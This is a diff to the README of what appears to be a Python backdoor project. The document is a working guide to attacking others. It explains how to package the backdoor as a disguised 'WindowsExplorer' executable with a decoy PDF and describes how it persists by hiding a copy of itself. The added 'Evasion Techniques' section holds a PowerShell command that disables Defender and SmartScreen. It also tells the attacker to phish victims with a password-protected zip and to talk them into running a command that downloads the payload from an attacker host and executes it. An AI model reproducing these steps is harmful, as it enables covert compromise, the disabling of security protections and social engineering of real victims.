@@ -1,5 +1,6 @@
 # ⚠️ | This Backdoor dosen't bypass windows defender and other AV's completely
 
+---
 ## Note :
 Unobfuscated backdoor will be detected and quarintined by defender
 
@@ -18,6 +19,7 @@ Unobfuscated backdoor will be detected and quarintined by defender
 1. ### clone this repo :
     ```zsh
    git clone https://github.com/Anonomous69/Backdoor
+   pip install requests pillow pyautogui
    ```
 
    cd to that directory (also dont forget to change the [Pastebin.com](https://pastebin.com) URL)
@@ -25,7 +27,8 @@ Unobfuscated backdoor will be detected and quarintined by defender
 2. ### find your pyinstaller path and run :
 #### For windows :
 ```powershell
-    C:\Users\wherever\your\path\is\pyinstaller.exe --onefile --noconsole --name "WindowsExplorer" --icon="icon.ico" --add-data "sample.pdf;." backdoor.py
+    C:\Users\wherever\your\path\is\pyinstaller.exe --onefile --noconsole --name "WindowsExplorer" --icon="icon.ico" ——version-file=version_info.txt —add-data "sample.pdf;." Unobfuscated\plain_backdoor.py
+    
 ```
   
 #### For MacOS :    
@@ -51,6 +54,7 @@ Unobfuscated backdoor will be detected and quarintined by defender
    ```
  when target clicks backdoor, you get the connection
  
+---
 
 # Working of this backdoor 
 
@@ -84,3 +88,21 @@ It then **copies itself to a hidden/system-like location** and re-executes from 
 
 ### 📰 3. **Distraction Mechanism**
 To **distract the victim**, it opens a decoy PDF file after execution.
+
+
+---
+
+# Evasion Techniques :
+To Disable Defender via Administrative powershell :
+Note : Must have Tamper protection off
+```powershell
+Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableIOAVProtection $true; Set-MpPreference -DisableScriptScanning $true; Set-MpPreference -PUAProtection 0; Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\AppHost" -Name "EnableWebContentEvaluation" -Value 0; Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off"
+```
+To avoid Cloud/Browser based detections :
+1. Convert the .exe to Zip file with password protection and use email phishing 
+2. Convince the victim to execute these commands assuming he has 7zip-archive installed:
+Win + R and then :
+```powershell
+powershell -Command "Invoke-WebRequest -Uri 'http://<IP>/Windows.zip' -OutFile '$env:TEMP\Windows.zip'; & 'C:\Program Files\7-Zip\7z.exe' x '$env:TEMP\Windows.zip' -o'$env:TEMP' -p12345 -y; Start-Process '$env:TEMP\file.exe'"
+```
+Note : The backdoor will likely be flagged unless Defender is disabled 
